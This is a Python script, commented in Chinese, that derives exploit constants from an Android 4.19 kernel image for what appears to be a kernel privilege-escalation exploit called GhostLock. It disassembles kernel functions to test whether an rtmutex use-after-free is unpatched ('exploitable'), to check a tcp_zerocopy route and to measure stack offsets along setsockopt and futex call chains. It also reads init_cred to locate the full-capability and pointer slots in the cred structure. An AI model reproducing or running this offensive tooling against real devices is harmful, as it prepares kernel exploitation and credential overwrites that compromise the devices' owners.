#!/usr/bin/env python3
# derive_consts.py —— 把 GhostLock `derive.rs` 的推导搬到"内存读取"之上（离线用镜像模拟）
#
# 移植的判据（与他们的 Rust 同语义）：
#  1) ensure_rtmutex_43499_unpatched : remove_waiter() 里是否还有 `mrs xN, sp_el0`(读 current)
#       有 ⇒ 未打补丁(可打) ; 无 ⇒ 该 UAF 修复已在
#  2) tcp_zerocopy_receive_inlined   : do_tcp_{get,set}sockopt 是否直接 bl 到 tcp_zerocopy_vm_insert_batch
#  3) multicast_waiter_off(5.15)     : Σsetsockopt链帧数 − greqs_off 与 Σfutex链帧数 − waiter_local 之差
#  4) select_cred_caps / cred_refs   : 直接读 init_cred 的字段值来反推 cred 布局（他们本来就是内存值推导）
import sys, re, importlib.util

spec = importlib.util.spec_from_file_location('rp', '/tmp/ourpy/runtime_profile.py')
rp = importlib.util.module_from_spec(spec)
sys.argv = ['runtime_profile.py', '/tmp/umi_Image', '/sdcard/Download/ksym_order.txt', '/tmp/out_ignore.conf',
            '4.19.113-perf-gec90c723c482']
spec.loader.exec_module(rp)          # 跑一遍自举（约几分钟），拿到 idx_of/offs/BLOB
BLOB = rp.BLOB
SYMS = {}
for name, i in rp.idx_of.items():
    SYMS[name] = rp.offs[i] - rp.t_off

from capstone import Cs, CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN
md = Cs(CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN)

def sorted_offs():
    return sorted(SYMS.values())

SO = sorted_offs()

def disasm_symbol(name, cap=0x2000):
    if name not in SYMS:
        return None
    start = SYMS[name]
    higher = next((o for o in SO if o > start), start + cap)
    stop = min(start + cap, higher)
    code = BLOB[start:stop]
    out = []
    for ins in md.disasm(code, start):
        out.append('%s %s' % (ins.mnemonic, ins.op_str))
    return out

# ---------- 1) rtmutex UAF（他们的可打性判据） ----------
print('=== 1) remove_waiter / rtmutex-UAF 判据 ===')
dis = disasm_symbol('remove_waiter')
if dis is None:
    print('    remove_waiter 不在符号表 ⇒ 无法判定')
else:
    mrs = re.compile(r'(?i)\bmrs\s+x\d+,\s*(sp_el0|s3_0_c4_c1_0)\b')
    hits = [l for l in dis if mrs.search(l)]
    print('    remove_waiter 反汇编 %d 条指令' % len(dis))
    print('    读到 current(sp_el0) 的指令 %d 条 ⇒ %s' %
          (len(hits), '未打补丁（按他们的判据=可打）' if hits else '已含修复（按他们的判据=不可打）'))
    for l in hits[:3]:
        print('      %s' % l)

# ---------- 2) tcp_zerocopy 6.1 路线是否存在 ----------
print('=== 2) tcp_zerocopy_receive_inlined（6.1 路线） ===')
if 'tcp_zerocopy_vm_insert_batch' not in SYMS:
    print('    符号 tcp_zerocopy_vm_insert_batch 不存在 ⇒ 该路线在本内核不可用（与预期一致，4.19 无此路径）')
else:
    tgt = SYMS['tcp_zerocopy_vm_insert_batch']
    got = False
    for h in ('do_tcp_getsockopt', 'do_tcp_setsockopt'):
        d = disasm_symbol(h)
        if not d:
            continue
        for l in d:
            if l.startswith('bl ') and l.split()[-1] == hex(tgt):
                got = True; break
    print('    inlined = %s' % got)

# ---------- 3) 5.15 multicast 几何（链帧数法） ----------
print('=== 3) multicast_waiter_off（5.15 路线） ===')
SET_CHAIN = ['__arm64_sys_setsockopt', '__sys_setsockopt', 'sock_common_setsockopt', 'udp_setsockopt', 'ip_setsockopt']
FUTEX_CHAIN = ['__arm64_sys_futex', 'do_futex', 'futex_wait_requeue_pi']
present = [n for n in SET_CHAIN + FUTEX_CHAIN if n in SYMS]
missing = [n for n in SET_CHAIN + FUTEX_CHAIN if n not in SYMS]
print('    链符号: 存在 %d / %d   缺: %s' % (len(present), len(SET_CHAIN + FUTEX_CHAIN), ', '.join(missing) or '无'))
def first_sp_frame(name):
    d = disasm_symbol(name)
    if not d:
        return None
    tot = 0
    for l in d[:200]:
        m = re.match(r'(?i)^(stp|str)\s+x\d+,\s*\[sp,\s*#-?0x([0-9a-f]+)\]', l)
        if m:
            tot += int(m.group(2), 16)
            continue
        if re.match(r'(?i)^sub\s+sp,\s*sp,\s*#0x', l):
            tot += int(l.split('#')[1], 16)
            continue
        if re.match(r'(?i)^(bl|b|ret)\b', l):
            return tot
    return tot
frames = {}
for n in present:
    f = first_sp_frame(n)
    frames[n] = f
    print('    %-28s 首帧 sp 降幅 = %s' % (n, f))

# ---------- 4) cred 布局（他们本来就是按内存值推） ----------
print('=== 4) select_cred_caps / cred_refs（读 init_cred 字段值） ===')
base = SYMS.get('init_cred')
print('    init_cred offset = %s' % hex(base) if base is not None else '    缺 init_cred')
if base is not None:
    def read64(off):
        return int.from_bytes(BLOB[base + off: base + off + 8], 'little')
    slots = [(o, read64(o)) for o in range(0x20, 0x100, 8)]
    nz = [(hex(o), hex(v)) for o, v in slots if v]
    print('    非零槽: %s' % nz[:8])
    caps = [o for o, v in slots if v == 0x1ffffffffff]
    print('    CAP_FULL_SET(0x1ffffffffff) 槽: %s' % [hex(o) for o in caps])
    refs = [(hex(o), hex(v)) for o, v in slots if v >= 0xffffff8000000000]
    print('    内核 VA 槽(指针): %s' % refs[:6])